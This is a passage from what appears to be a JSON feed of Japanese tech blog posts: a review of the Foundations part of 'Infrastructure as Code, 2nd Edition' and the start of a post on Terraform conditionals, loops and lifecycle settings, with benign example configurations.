、リスクを最小限に抑えつつ高いパフォーマンスを実現する方法を提案しています。セクション全体を通して、可読性、再利用性、モジュール性の観点からインフラストラクチャコードを設計することの重要性が強調されています。コードの品質と管理性を高めることは、時間の経過と共にシステムのメンテナンスと進化を容易にします。また、セキュリティとコンプライアンスの考慮は、現代のインフラストラクチャスタックの設計と運用において不可欠な要素です。最終的に、このセクションは、インフラストラクチャスタックの管理における複雑性と挑戦に対処するための網羅的で実践的なガイドを提供しており、読者にとって非常に価値のあるリソースであると言えます。この知識を活用することで、ITプロフェッショナルはより強固で効率的なシステムを構築し、ビジネスの成長と変化に迅速に対応できるようになるでしょう。Infrastructure as Code, 2nd Editionの読書感想文Infrastructure as Code, 2nd Edition の I. Foundations 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のII. Working With Infrastructure Stacks 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition の III. Working With Servers And Other Application Runtime Platforms 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のIV. Designing Infrastructure 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のV. Delivering Infrastructure 読書感想文 - じゃあ、おうちで学べる","link":"https://syu-m-5151.hatenablog.com/entry/2023/11/16/015354","isoDate":"2023-11-15T16:53:54.000Z","dateMiliSeconds":1700067234000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Infrastructure as Code, 2nd Edition の I. Foundations 読書感想文","contentSnippet":"はじめに2016年、初版の『Infrastructure as Code』がリリースされ、クラウド技術の運用における新たな標準をぶち立てました。公式サイトもここに置いておきます。infrastructure-as-code.com初版の2017年に日本語版がリリースされました。mizzy.orgそれから4年後、待望の『Infrastructure as Code, 2nd Edition』が登場した。この新版は、サブタイトルを「Managing Servers in the Cloud」から「Dynamic Systems for the Cloud Age」へと変更し、クラウド技術の進化と共に変わるシステム管理のダイナミクスに焦点を当てている。さらに、360ページから427ページへと内容が拡張され、より包括的な情報と洞察が提供されている。残念ながら、『Infrastructure as Code, 2nd Edition』の日本語版は現在提供されていませんがこの本はクラウドインフラストラクチャの管理に関して重要な洞察と知識を提供しており、その内容は多くの専門家や技術者にとって非常に価値があります。Infrastructure as Code: Dynamic Systems for the Cloud Age (English Edition)作者:Morris, KiefO\'Reilly MediaAmazon『Infrastructure as Code』の第二版では、かつて新しい概念として導入されたインフラストラクチャとしてのコードが、今や世界中の企業、銀行や伝統的な組織を含めてクラウドへの移行が進む中で、開発チームが大規模なインフラコードベースの構築において不可欠なものとなっています。この改訂版は、DevOpsチームによって開発された原則、実践、パターンを活用し、クラウド時代に適したインフラの管理方法を明らかにしています。システム管理者、インフラエンジニア、ソフトウェア開発者たちに、クラウドと自動化技術を用いて、容易に、安全に、迅速に、かつ責任を持って変更を加える方法を教えます。また、コードとして全てを定義し、小さく疎結合な部品を組み合わせてシステムを構築する技術も伝えます。ただし、日本語版のリリースがなされぬままに、次の第三版が出版される可能性があります。これはそういった悲しみの読書感想文でもあります。また、このブログはずっと。次回の記事syu-m-5151.hatenablog.com目次I. Foundations (基礎)1. What Is Infrastructure As Code? (インフラストラクチャとしてのコードとは何か？)   - インフラストラクチャをコードで管理する概念とその重要性について説明します。2. Principles Of Cloud Age Infrastructure (クラウド時代のインフラストラクチャの原則)   - クラウドインフラストラクチャ管理の基本原則を掘り下げます。3. Infrastructure Platforms (インフラストラクチャプラットフォーム)   - 現代のインフラストラクチャプラットフォームの種類と特徴について論じます。4. Core Practice: Define Everything As Code (コアプラクティス：すべてをコードとして定義する)   - インフラストラクチャ要素をコードとして定義する実践方法に焦点を当てます。II. Working With Infrastructure Stacks (インフラストラクチャスタックとの作業)5. Building Infrastructure Stacks As Code (インフラストラクチャスタックをコードとして構築する)   - インフラストラクチャスタックをコードで構築するプロセスとテクニックを紹介します。6. Building Environments With Stacks (スタックで環境を構築する)   - スタックを使用して異なる環境を構築する方法を解説します。7. Configuring Stack Instances (スタックインスタンスの設定)   - 個々のスタックインスタンスを設定するための戦略とベストプラクティスを提供します。8. Core Practice: Continuously Test And Deliver (コアプラクティス：継続的なテストと提供)   - インフラストラクチャコードの継続的なテストと提供の重要性について論じます。9. Testing Infrastructure Stacks (インフラストラクチャスタックのテスト)   - インフラストラクチャスタックのテスト手法と戦略を紹介します。III. Working With Servers And Other Application Runtime Platforms (サーバーおよびその他のアプリケーションランタイムプラットフォームとの作業)10. Application Runtimes (アプリケーションランタイム)    - アプリケーションの実行環境に関する概要と管理方法を提供します。11. Building Servers As Code (サーバーをコードとして構築する)    - コードを使用してサーバーを構築する方法について詳しく説明します。12. Managing Changes To Servers (サーバーへの変更の管理)    - サーバーに加えられる変更を効果的に管理する戦略を提供します。13. Server Images As Code (サーバーイメージをコードとして)    - サーバーイメージをコード化するアプローチとその利点について解説します。14. Building Clusters As Code (クラスターをコードとして構築する)    - クラスターを効率的にコードで構築する手法について紹介します。IV. Designing Infrastructure (インフラストラクチャの設計)15. Core Practice: Small, Simple Pieces (コアプラクティス：小さく、単純な部品)    - 小さく単純な部品を使用してインフラストラクチャを設計する方法に焦点を当てます。16. Building Stacks From Components (コンポーネントからスタックを構築する)    - 個々のコンポーネントから効果的なスタックを構築するアプローチを提供します。17. Using Stacks As Components (スタックをコンポーネントとして使用する)    - スタックをコンポーネントとして活用するための戦略について説明します。V. Delivering Infrastructure (インフラストラクチャの提供)18. Organizing Infrastructure Code (インフラストラクチャコードの整理)    - インフラストラクチャコードを整理し管理する方法について論じます。19. Delivering Infrastructure Code (インフラストラクチャコードの提供)    - インフラストラクチャコードを効果的に提供する戦略について解説します。20. Team Workflows (チームワークフロー)    - チームがインフラストラクチャコードを管理し作業するためのワークフローについて紹介します。21. Safely Changing Infrastructure (インフラストラクチャの安全な変更)    - インフラストラクチャを安全に変更するための実践的なアドバイスを提供します。I. Foundations (基礎)What Is Infrastructure As Code? (インフラストラクチャとしてのコードとは何か？)この章は、現代のITインフラストラクチャの管理における根本的なシフトを示唆しています。クラウドとインフラストラクチャの自動化技術は、より迅速かつ信頼性の高い価値提供を可能にする一方で、管理するべきものの複雑さと多様性を増大させています。このジレンマは、組織がデジタル化するにつれて特に重要になってきています。「デジタル」という言葉は、ソフトウェアシステムが組織の活動に不可欠であることを意味します。これは私自身のソフトウェアエンジニアおよびSREとしての経験にも共鳴します。変更管理プロセスを厳格化することで混乱を防ごうとする試みは、しばしばクラウド技術の利点を損なうものです。「クラウドと自動化技術を利用して、変更を容易に、安全に、迅速に、そして責任を持って行うことができる」というこの本の前提は、特に重要です。この利点は、自動化ツールやクラウドプラットフォームというツールそのものからではなく、これらの技術の使い方に依存しています。印象的なのは、インフラストラクチャとしてのコード（IaC）が、ソフトウェア開発からの実践に基づいたインフラストラクチャの自動化へのアプローチであるという点です。これは、システムのプロビジョニングと変更およびその設定を一貫して、繰り返し可能なルーチンとして扱います。コードの変更を行い、それらの変更をシステムに自動的にテストし適用します。この章はまた、クラウド時代のインフラストラクチャへのアプローチが、速度と品質の間の偽のジレンマを排除する方法を説明しています。速度を品質向上の手段として利用し、品質を高速なデリバリーの可能性として利用します。また、このような言及が出てくるのもソフトウェア開発のプラクティスに基づくインフラストラクチャ自動化のアプローチとして定着しているこの本ならではだなって思いました。t-wada.hatenablog.jp「クラウド時代のインフラストラクチャを管理するためには、クラウド時代のマインドセットが必要」というメッセージは、私の経験と完全に一致します。クラウド時代では、変更の速度を利用してリスクを減らし、品質を向上させる新しい考え方が求められます。このアプローチは、根本的なアプローチの変更と変更とリスクに対する新しい考え方を必要とします。\\"A fundamental truth of the Cloud Age is: Stablity comes from making changes.\\"（クラウド時代の基本的な真理は：変更から安定性が生まれる）は、インフラストラクチャの管理における直感に反すると思いますが2023年の現在ではとても納得することが出来ます。未パッチのシステムは安定しているのではなく、脆弱であり、発見した問題をすぐに修正できない場合、システムは安定していないという考え方です。最後に、インフラストラクチャとしてのコードの3つのコアプラクティス：すべてをコードとして定義する、進行中のすべての作業を継続的にテストし提供する、そして、独立して変更できる小さくシンプルな部品を構築する、これらはインフラストラクチャの管理における新しい標準を示しています。似たようなプラクティスはソフトウェア開発でももちろん存在していてソフトウェア開発のプラクティスをインフラ管理に持ち込める強みのようなものを強く感じました。レガシーコードからの脱却 ―ソフトウェアの寿命を延ばし価値を高める9つのプラクティス作者:David Scott BernsteinオライリージャパンAmazonこの章を読んで、クラウド時代におけるインフラストラクチャ管理の新しい考え方とアプローチについての理解が深まりました。2. Principles Of Cloud Age Infrastructure (クラウド時代のインフラストラクチャの原則)この章は、クラウド時代のインフラストラクチャ設計と実装における基本原則を提示し、それらがどのように従来の「鉄の時代」のインフラストラクチャと異なるかを示しています。クラウド時代はコンピューティングリソースを物理的なハードウェアから切り離し、これらが仮想的な構成物として変更や破棄が可能になります。「鉄の時代」とCloud Native を語っている書籍があり一章だけでも面白いの読んでほしいです。Kubernetesで実践するクラウドネイティブDevOps作者:John Arundel,Justin DomingusオライリージャパンAmazon原則: Assume Systems Are Unreliable (システムが信頼できないと仮定する)クラウドスケールのインフラストラクチャでは、信頼性のあるハードウェアを使用しても障害は発生します。この原則は、根底のリソースが変化したときにも中断なくサービスを提供するための設計を必要とします。重要性と実装の方法この原則の重要性は、特にクラウド環境で顕著になります。クラウドでは、物理的なサーバーやネットワーク機器に依存しない仮想化されたリソースを使用します。これらのリソースは柔軟でスケーラブルですが、未知だったりコントロール外の障害の可能性も含まれています。したがって、システムの設計において、予期しないエラーに対処する機能を組み込むことが重要です。障害を前提とした設計では、冗長性の構築、フォールトトレラントなアーキテクチャの採用、自動回復機構の組み込みなどが行われます。例えば、データの自動バックアップ、複数の地域にまたがるサービスのデプロイ、障害発生時にトラフィックを自動的に切り替えるロードバランシングなどがこれに該当します。総合的なアプローチシステムの信頼性を高めるためには、ハードウェアとソフトウェアの両方の側面を考慮した総合的なアプローチが必要です。これには、適切なハードウェアの選択、ログやメトリクスの取り扱い、ソフトウェアの品質保証、セキュリティ対策、そして継続的なメンテナンスとアップデートが含まれます。「システムが信頼できないと仮定する」という原則は、特にクラウドベースのインフラストラクチャにおいて重要です。この原則に従うことで、システムはより堅牢で回復力があり、最終的にはユーザーに対してより信頼性の高いサービスを提供することができます。このアプローチを採用することで、企業は技術的な障害によるリスクを最小限に抑え、ビジネスの継続性を確保することができるのです。参考リンクAWSの公式ドキュメント - AWS Well-Architected FrameworkAWSが提供するこのフレームワークは、信頼性の高いクラウドアプリケーションの設計に関するベストプラクティスを示しています。Google Cloudのドキュメント - Google Cloud Architecture FrameworkGoogle Cloudでの信頼性の高いシステム設計に関する包括的なガイドです。『Site Reliability Engineering』GoogleのSREチームによって書かれたこの本は、大規模なシステムの信頼性を保つための実践的なアプローチを紹介しています。『継続的デリバリー　信頼できるソフトウエアリリースのためのビルド・テスト・デプロイメントの自動化』本書は、本番環境にデプロイされるソフトウェアの設計において考慮すべき点、特に継続的デリバリーをどのように実践するかに重点を置いています。原則: Make Everything Reproducible (全てを再現可能にする)システムの回復性を高める一つの方法は、その部品を容易かつ信頼性高く再構築できるようにすることです。これによりテスト環境を本番環境と一致させたり、負荷の高い時に需要に応じてインスタンスを追加することが容易になります。でも、実際には様々な理由から完全に一致させることは難しいので機能を制限したりコスト削減の為にkube-downscalerやInstance Schedulerなどを入れるようにしましょう。実際の経験から、この原則を守るためのキーポイントは、構成管理とバージョン管理の徹底です。例えば、私が取り組んだプロジェクトでは、全てのサーバー設定や依存関係をコードで管理し、Gitなどのバージョン管理システムを使用しました。これにより、ある特定のバージョンのコードベースから環境を正確に再現できるようになります。また、自動化されたデプロイメントパイプラインを設置することで、一貫性のあるデプロイメントプロセスを確保しました。これは、予期しない問題が生じた場合に、迅速に対応できるようにするために重要です。さらに、継続的インテグレーション（CI）を活用することも大切です。CIツールを使用することで、コードの変更が他の部分に悪影響を及ぼさないかどうかを常に確認できます。例えば、新しい機能を追加する際には、既存のシステムに影響がないかを自動テストで確認します。これにより、安定した本番環境を保ちながら迅速に開発を進めることができます。最後に、ドキュメントの重要性を忘れてはなりません。システムの各部分がどのように機能し、どのように相互作用するかを明確に文書化することで、新しいメンバーやチーム外の人がシステムを理解しやすくなります。これにより、効率的なコラボレーションと問題解決が促進されます。落とし穴: Snowflake Systems (特殊なシステムの罠)スノーフレークシステムは再構築が困難なシステムのインスタンス、または本来似ているべき環境が理解できない方法で異なる環境を指します。これらのシステムはリスクを生み、管理するチームの時間を浪費します。特殊な設定やカスタムの依存関係が原因で、システムが一意的になりすぎることがあります。これは、将来のスケーラビリティやメンテナンス、アップグレードの際に問題を引き起こします。また、これらのシステムは新しいチームメンバーにとって理解しにくく、エラーの原因となる可能性が高まります。原則: Create Disposable Things (廃棄可能なものを作る)ダイナミックなインフラストラクチャに対処するためのシステムを構築することは重要ですが、システム自体がダイナミックであることも重要です。部品を柔軟に追加、削除、開始、停止、変更、移動できるようにすることが重要です。この原則の鍵は、自動化とスケーラビリティです。インフラストラクチャのコード化（Infrastructure as Code: IaC）を採用することで、システムの部品を簡単に作成し、廃棄することができます。また、コンテナ技術やサーバーレスアーキテクチャを利用することで、リソースを効率的に管理し、必要に応じて柔軟にスケールアップまたはスケールダウンできます。これにより、システムのメンテナンスやアップデートを簡単に行い、変更に迅速に対応できるようになります。原則: Minimize Variation (変動を最小限にする)システムが成長するにつれて、理解、変更、修正が難しくなります。多くの異なる種類の部品があるほど、作業は複雑になります。したがって、システムを管理しやすくするためには、異なる種類の部品を少なくすることが有用です。私の経験では、使用する技術やツールの数を最小限に抑えることで、システムの理解と管理が大幅に容易になりました。例えば、異なるプロジェクトやチーム間で同じ技術スタックやツールを使用することで、知識の共有が容易になり、新しいメンバーのトレーニングもスムーズに進みました。Configuration Drift (設定の変動)設定の変動は、かつて同一だったシステムが時間の経過とともに異なるようになることを指します。手動での変更や、一部のインスタンスにのみ自動化ツールを使用して行うアドホックな変更が原因で発生することがあります。この問題を解決するために、私は以前のプロジェクトで、全ての設定変更を中央で管理し、自動化ツールを用いて全インスタンスに一貫して適用する方法を採用しました。これにより、設定の一貫性が保たれ、予期しない問題の発生を防ぐことができました。Configuration Drift: How It Happens, Top Sources + How to Stop It for Good原則: Ensure That You Can Repeat Any Process (任意のプロセスを繰り返せるようにする)再現性の原則に基づき、インフラストラクチャに対して行うあらゆる操作を繰り返せるようにする必要があります。スクリプトや設定管理ツールを使用して行動を繰り返す方が、手動で行うよりも簡単です。実際、私は自動化ツールやスクリプトを利用して、インフラストラクチャの構築、設定、デプロイを繰り返し可能にしました。これにより、新しい環境を迅速かつ一貫して構築でき、エラーの発生率を低減しました。また、これらのプロセスを文書化し、全チームメンバーが理解しやすい形で共有することで、作業の効率化と知識の共有を実現しました。SREにおけるトイルの判断と切り分け方IT Infrastructure Automation: A Beginner’s Guideこの章を読んで、クラウド時代のインフラストラクチャの原則が、伝統的なインフラストラクチャとどのように異なるか、そしてこれらの原則がどのようにクラウドプラットフォームの性質を最大限に活用する鍵となるかを理解しました。クラウドプラットフォームにおける変更の容易さを抵抗するのではなく、品質と信頼性を得るためにそれを利用することの重要性が強調されています。3. Infrastructure Platforms (インフラストラクチャプラットフォーム)この章では、クラウドインフラストラクチャの複雑さを解体し、その構成要素を理解しやすく分類しています。ここで提示されたモデルは、特定の技術やツールに依存することなく、概念やアプローチを議論するための文脈を作り出しています。これは非常に有益で、私たちが使用するテクノロジースタックやプラットフォームに関係なく、議論を関連性のあるものに保つために役立ちます。インフラストラクチャシステムの部品 (The Parts of an Infrastructure System)モダンなクラウドインフラストラクチャは、アプリケーション、アプリケーションランタイム、インフラストラクチャプラットフォームの3つの主要な層で構成されています。この分類は、インフラストラクチャの複雑な世界を整理し、各層がどのように組織全体の機能提供に寄与しているかを明確にします。私の経験では、この3層モデルを理解し、適切に管理することが、効率的なシステム運用に不可欠です。特にアプリケーション層の性能と信頼性を保証するためには、アプリケーションランタイムとインフラストラクチャプラットフォームの調和が必要です。例えば、あるプロジェクトでは、コンテナ化されたアプリケーションをクラウド上で稼働させるために、Kubernetesを使用しました。これにより、アプリケーションランタイムの管理が容易になり、インフラストラクチャプラットフォームのリソースを効率的に利用することができました。また、これらの層を適切に管理することで、全体のシステムメンテナンスやアップグレードもスムーズに行えるようになりました。しかし、すべてのプロジェクトで当てはまるわけではないです。他のプロジェクトには他の要件や制約がありそれぞれに違う正解があると思います。Figure 3-1. Layers of system elements より引用\\"Applications and services provide capabilities to your organization and its users. Everything else in this model exists to enable this layer.\\" (アプリケーションとサービスは、あなたの組織とそのユーザーに機能を提供します。このモデルの他のすべては、この層を可能にするために存在します。)はアプリケーション層が最終的な目標であり、アプリケーションランタイムとインフラストラクチャプラットフォームがその実現のための手段であることを示しています。これは、インフラストラクチャをただのサポート機能ではなく、組織の目的達成に不可欠な要素として位置づけている点で示唆に富んでいます。インフラストラクチャプラットフォーム (Infrastructure Platforms)このセクションは、インフラストラクチャとしてのコード実践において、ダイナミックなインフラストラクチャプラットフォームがいかに中心的な役割を担っているかを強調しています。クラウド技術は物理ハードウェアからの解放をもたらし、APIを通じた資源の管理を可能にしました。一部をクラウドベースのインフラストラクチャプラットフォームを活用することで、システムの柔軟性と拡張性が大幅に向上しました。例えば、AWSのサービスを使用して、サーバーレスアーキテクチャを構築しました。これにより、物理的なハードウェアの制約から解放され、APIを介してリソースを効率的に管理することができるようになりました。このアプローチは、システムの拡張性を高めるだけでなく、運用コストの削減にも寄与することがあります。\\"Virtualization decoupled systems from the hardware they ran on, and cloud added APIs to manage those virtualized resources.\\" (仮想化はシステムを実行しているハードウェアから切り離し、クラウドはこれらの仮想化されたリソースを管理するAPIを追加しました。)は仮想化とクラウドがどのようにしてインフラストラクチャの運用を変革したかを端的に表しています。APIによる管理は、リソースの柔軟な扱いを可能にし、インフラストラクチャの変更や拡張を以前に比べて格段に簡単にしました。インフラストラクチャリソース (Infrastructure Resources)インフラストラクチャリソースは、現代のITシステムの根幹を成す重要な要素です。計算、ストレージ、ネットワークのこれら3つの基本リソースは、システムの性能や拡張性を決定づける要因となります。仮想マシン、コンテナインスタンス、データベースインスタンスなどの形態で利用されるこれらのリソースは、クラウドインフラストラクチャにおいて特に重要です。これらを適切に管理し、最適化することで、システムの効率性、柔軟性、信頼性を高めることができます。\\"The line between a primitive and a composite resource is arbitrary, as is the line between a composite infrastructure resource and an application runtime service.\\" (プリミティブリソースとコンポジットリソースの間、またコンポジットインフラストラクチャリソースとアプリケーションランタイムサービスの間の線引きは任意です。)は、インフラストラクチャリソースのカテゴライズが一定の基準に基づいているわけではなく、使用する文脈や目的に応じて変わることがあるという点を浮き彫りにしています。重要なのは、これらのリソースをどのようにして有効に組み合わせ、運用するかということであり、そのためには柔軟性が必要です。全体を通して、この章はクラウドインフラストラクチャの理解を深め、それぞれの要素がどのように相互作用して機能するのかを示す貴重な洞察を提供しています。これらの知識は、インフラストラクチャとしてのコードを実践する上で、私たちが直面する課題への取り組み方や、利用可能な技術を選択する際の指針となります。4. Core Practice: Define Everything As Code (コアプラクティス：すべてをコードとして定義する)インフラストラクチャをコードとして定義する理由 (Why You Should Define Your Infrastructure as Code)インフラエンジニアとして、インフラストラクチャをコードとして定義することの価値を語るのは、自明の理だと感じます。しかし、このアプローチは私たちの仕事を根本的に変えました。初めて自動化スクリプトを書いたとき、それは単なる作業の簡略化ではなく、再利用可能性、一貫性、透明性をもたらしました。これは組織のアジリティを高め、変更を迅速かつ確実に行う能力を提供する秘密の要因となります。これらの価値は、インフラストラクチャの変更が頻繁であろうとなかろうと、品質を向上させるために速度を活用することにあります。コードとして定義できるもの (What You Can Define as Code)過去にはプラットフォームのウェブベースのユーザーインターフェイスを使用したり、CLIを駆使してインフラストラクチャを手動でプロビジョニングすることが一般的でした。しかし、インフラストラクチャをコード化することで、過去のプロジェクトで見た、可視性の高い変更管理と迅速な展開の実現が可能となりました。これは、経験上も正しく技術的な変更が頻繁に発生する環境で特に重要です。インフラストラクチャをコードとして定義することは、変更の自動化、文書化されたプロセス、およびエラーの減少に大きく貢献します。また、様々な現場ではIaCを通じて運用効率の向上、設定の一貫性、そしてセキュリティの強化を実現しています。IaCはリスクを軽減し、復元力の高いシステムを構築するための重要な手段となっています。さらに、チームの生産性の向上とスケールアップの際の柔軟性も、IaCの利用によって可能となっています。インフラストラクチャコーディング言語 (Infrastructure Coding Languages)スクリプト言語やDSLの使用から、一般的なプログラミング言語を使用したインフラストラクチャのツールへの移行は、運用の柔軟性を飛躍的に向上させました。以前に取り組んだプロジェクトでは、Terraformのような宣言的言語を使用してインフラストラクチャを定義し、それがもたらすシンプルさと明確さに驚かされました。このようなツールにより、インフラストラクチャのコードが従来のプログラミングコードと同様に「リアルなコード」として扱われるようになりました。インフラストラクチャをコードとして定義するための実装原則 (Implementation Principles for Defining Infrastructure as Code)宣言的と命令的コードを混在させることなく、インフラストラクチャコードを「リアルな」コードとして扱うことは、私たちのコードベースをクリーンに保つために不可欠です。参加した多くのプロジェクトでは、技術的負債を積極的に管理し、コードの品質を維持するために、コードレビュー、ペアプログラミング、自動テストなどの慣行を取り入れていました。これらは、インフラストラクチャコードの維持可能性を確保するために重要な実践です。この章は、システムをコードとしてどのように定義するか、その方法とその背後にある理由を詳細に説明しています。インフラストラクチャを定義するための適切な言語を選択することは、効果的なインフラストラクチャを構築する上での重要な課題です。私の経験では、この課題はまだ解決されていませんが、本書を通じて、このテーマが再び現れ、私たち全員が最善の方法を発見するための考察を深めることを期待しています。まとめ『Infrastructure as Code』の初めの4章は、クラウド時代のインフラストラクチャ管理の新しいパラダイムを解き明かしています。第1章では、変更を効率的に、安全に、かつ迅速に行うためのインフラストラクチャとしてのコード（IaC）の基礎を設定します。第2章では、システムの不確実性を前提とし、再現性、廃棄可能性、変動の最小化といったクラウド時代のインフラストラクチャ設計の原則に深く潜ります。第3章は、インフラストラクチャプラットフォームとそのリソースがどのようにアプリケーションランタイム層の構築に寄与するかを具体的に説明し、計算、ストレージ、ネットワークという基本リソースを掘り下げます。そして第4章は、これらのリソースをシンプルで独立して変更可能な部品に分けることの重要性を強調し、チームワークフローとインフラストラクチャの安全な変更方法について具体的なガイダンスを提供します。これらの章は、IaCの実践における基本的な理解を構築し、次のセクション「II. Working With Infrastructure Stacks (インフラストラクチャスタックとの作業)」でのより具体的なスタック構築への取り組みへと説明してくれます。Infrastructure as Code, 2nd Editionの読書感想文Infrastructure as Code, 2nd Edition の I. Foundations 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のII. Working With Infrastructure Stacks 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition の III. Working With Servers And Other Application Runtime Platforms 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のIV. Designing Infrastructure 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のV. Delivering Infrastructure 読書感想文 - じゃあ、おうちで学べる","link":"https://syu-m-5151.hatenablog.com/entry/2023/11/15/134317","isoDate":"2023-11-15T04:43:17.000Z","dateMiliSeconds":1700023397000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Terraformの条件分岐にうってつけの日","contentSnippet":"Infrastructure as Codeの概念とTerraformの役割Infrastructure as Code (IaC) は、現代のインフラ管理の根幹を成すものです。IaCがどんなものか様々な言論があると思いますが、ここではソフトウェア開発のプラクティスに基づくインフラストラクチャ自動化のアプローチとIaC 本に準拠しておきます。IaCによる自動化、バージョン管理、テスト、そして継続的インテグレーションなどのプラクティスは、システム管理の世界に革命をもたらしました。ちなみに個人的には各々のプラクティスを一つずつ実践しない度にIaCの価値は一つずつ確実に下がっていくものだと確信してます。ですが、各々にコストがかかるものなので各プラクティスをどこまで実践するかは非常に難しい問題だとも同時に思います。その中で周知の事実だとは思いますがTerraformは、これらのプラクティスを宣言的なインフラストラクチャの管理、定義、および構成に応用することで、効率性と柔軟性の高いインフラストラクチャ管理を可能にします。このツールは、設計から実装までの過程を劇的に変える可能性を秘めています。Infrastructure as Codeの概念とTerraformの役割に関する参考リンクInfrastructure as Code - AWSInfrastructure as Code - Google CloudIntroduction to Terraform - HashiCorpInfrastructure as Codeの原則とTerraformInfrastructure as Codeの原則には、以下のような要素が含まれます​​:簡単に再現できるシステム: Terraformを使用することで、インフラストラクチャをコードとして定義し、簡単に再現可能なシステムを構築できます。使い捨てにできるシステム: サーバーなどのリソースを一時的なものとして扱い、必要に応じて簡単に生成・破棄できます。統一的なシステム: 全てのインフラストラクチャのコンポーネントを統一的な方法で管理します。反復できるプロセス: 同じ設定を繰り返し適用することで、一貫性と信頼性を保ちます。これらの原則に基づいて、Terraformは以下のような機能を提供します:リソースの自動生成と管理: Terraformを使用すると、インフラストラクチャのリソースを自動的に生成・管理できます。宣言的なインフラの構築: Terraformを通じて、インフラストラクチャの状態を宣言的に定義し、計画的かつ一貫性のある方法でインフラを構築・更新します。バージョン管理のサポート: Terraformの設定ファイルはバージョン管理システムで管理でき、変更履歴を追跡できます。モジュールと再利用可能なコンポーネント: Terraformではモジュールを使って、コードの再利用性を高めます。なのでそれ以外のプラクティスに関しては別のソリューションで実現してあげる必要があります。Terraformの条件分岐のテクニックと利用場面もう少し能書きを垂れるかなって思ったんですけどもう飽きたので普通にテクニックや使い方の話をしていきます。Terraformは基本的に宣言的なインフラ定義ツールですが、宣言的だけでは現実の複雑な要求を満たすのが難しい場合があります。そのため、Terraformは手続き型プログラミングに近い柔軟性も提供します。条件分岐やループなど、より具体的な制御が必要な場面で役立つ機能を組み込んで、効率的かつ柔軟なインフラ管理を実現しています。それでは、これらのテクニックや利用場面について、具体的な例を交えて詳しく見ていきましょう。ループ (countとfor_each)ループは、同じタイプのリソースを複数回作成する際に便利です。countやfor_eachを使用して、コードの重複を避けながら、効率的にリソースを管理できます。利用場面A: 異なる環境に同一種類のリソースを複数作成resource \\"aws_instance\\" \\"dev_servers\\" {  count         = 5  instance_type = \\"t2.micro\\"  # その他の設定}利用場面B: 複数のユーザーにIAMロールを割り当てresource \\"aws_iam_user\\" \\"users\\" {  for_each = toset([\\"alice\\", \\"bob\\", \\"charlie\\"])  name     = each.value  # その他の設定}条件分岐 (countを使用)条件分岐を使用すると、環境やパラメータに基づいてリソースの作成を制御できます。これにより、開発環境と本番環境などで異なるリソース設定を実現できます。利用場面A: 本番環境でのみデータベースのインスタンスを作成resource \\"aws_db_instance\\" \\"prod_db\\" {  count = var.is_production ? 1 : 0  # データベースの設定}利用場面B: 開発環境ではリソースを作成せず、本番環境でのみ特定のリソース（例: S3バケット）を作成したい場合。resource \\"aws_s3_bucket\\" \\"prod_bucket\\" {  count  = var.env == \\"prod\\" ? 1 : 0  bucket = \\"my-production-bucket\\"  acl    = \\"private\\"}ここではvar.env変数がprod（本番環境）の場合にのみS3バケットを作成します利用場面C: 特定の機能フラグ（例: 監視機能の有効化）がオンの場合にのみ、関連リソース（例: CloudWatchアラーム）をデプロイしたい。resource \\"aws_cloudwatch_metric_alarm\\" \\"example_alarm\\" {  count               = var.enable_monitoring ? 1 : 0  alarm_name          = \\"High-CPU-Utilization\\"  comparison_operator = \\"GreaterThanThreshold\\"  evaluation_periods  = \\"2\\"  threshold           = \\"80\\"  # その他の設定}この例では、var.enable_monitoringがtrueの場合にのみCloudWatchアラームを作成します。ゼロダウンタイムデプロイメント (create_before_destroyを使用)ゼロダウンタイムデプロイメントは、システムやアプリケーションの更新時にサービスを停止することなく、新しいバージョンへの移行を行う手法です。Terraformにおけるゼロダウンタイムデプロイメントでは、create_before_destroyライフサイクル設定を使用して、新しいリソースを古いリソースを削除する前に作成します。これにより、サービスが継続的に稼働しつつ、背後で安全にリソースの更新や交換が行われます。利用場面A: アプリケーションの更新時に新旧インスタンスの平滑な切り替えresource \\"aws_instance\\" \\"app_server\\" {  ami           = \\"ami-newversion\\"  instance_type = \\"t2.micro\\"  lifecycle {    create_before_destroy = true  }  # その他の設定}このコードは、新しいAMIでEC2インスタンスを作成します。create_before_destroyがtrueに設定されているため、新しいインスタンスが完全に起動し、運用準備が整うまで旧インスタンスは削除されません。これにより、アプリケーションの更新中もサービスが継続して提供されます。利用場面B: インフラのリファクタリング時に既存リソースの無停止更新resource \\"aws_s3_bucket\\" \\"storage\\" {  bucket = \\"my-new-bucket-name\\"  lifecycle {    create_before_destroy = true  }  # その他の設定}この設定では、新しいS3バケットが作成される際、既存のバケットは新しいバケットの設定が完了し、利用可能になるまで保持されます。これにより、データの移行やバケットの設定変更が行われる際にも、サービスの中断を回避できます。ゼロダウンタイムデプロイメントの限界ゼロダウンタイムデプロイメントは最高だと思った皆様、悲報です。ゼロダウンタイムデプロイメントを行う際にcreate_before_destroyを使用すると、いくつかの問題点があります。特に、オートスケーリングポリシーを使うと、デプロイメントごとに自動スケーリンググループ（ASG）のサイズが最小サイズに戻ることが問題です。これは、デプロイメント時にサーバー数が本来の数より少なくなる可能性があるためです。解決策として、カスタムスクリプトを使用してAWS APIでデプロイメント前のインスタンス数を取得する方法があります。しかし、より重要なのは、複雑なタスクにはネイティブな解決策を使用することが望ましいということです。たとえば、AWSではinstance refreshというオートスケーリンググループ用のネイティブソリューションが提供されており、これはAWSによって完全に管理され、エラー処理も適切です。ただし、このプロセスは時に遅いことが欠点です。一般的には、instance refreshのようなネイティブなデプロイメントオプションを使うことが推奨されています。なので、Providerの実装次第という部分もあると思います。Lifecycle をちゃんとやっていると、柔軟性と安全性が格段に向上するlifecycle引数は、リソースの作成と破棄に関するカスタムルールを作成することで、Terraform操作の流れを制御します。これにより、特定のリソースの変更やインフラへの影響を防ぎつつ、リソースニーズに基づいて潜在的なダウンタイムを最小限に抑えることができます​​。prevent_destroy: 